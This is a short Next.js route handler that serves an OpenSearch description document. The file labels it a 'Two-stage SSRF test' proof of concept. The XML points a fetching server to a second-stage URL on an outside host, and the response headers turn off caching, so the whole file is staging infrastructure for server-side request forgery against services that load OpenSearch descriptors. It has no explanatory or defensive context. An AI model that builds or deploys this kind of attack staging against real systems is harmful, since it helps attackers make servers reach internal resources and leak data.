import { NextResponse } from "next/server";

export const dynamic = "force-dynamic";

const XML_CONTENT = `<?xml version="1.0" encoding="UTF-8"?>
<OpenSearchDescription xmlns="http://a9.com/-/spec/opensearch/1.1/">
  <ShortName>SSRF PoC</ShortName>
  <Description>Two-stage SSRF test</Description>
  <Url type="application/atom+xml" template="https://blackroot-np.vercel.app/ssrf-opensearch-stage2"/>
</OpenSearchDescription>`;

export async function GET() {
  return new NextResponse(XML_CONTENT, {
    status: 200,
    headers: {
      "Content-Type": "application/xml; charset=utf-8",
      "Cache-Control": "no-cache, no-store, must-revalidate",
    },
  });
}

export async function HEAD() {
  return new NextResponse(null, {
    status: 200,
    headers: {
      "Content-Type": "application/xml; charset=utf-8",
      "Cache-Control": "no-cache, no-store, must-revalidate",
    },
  });
}
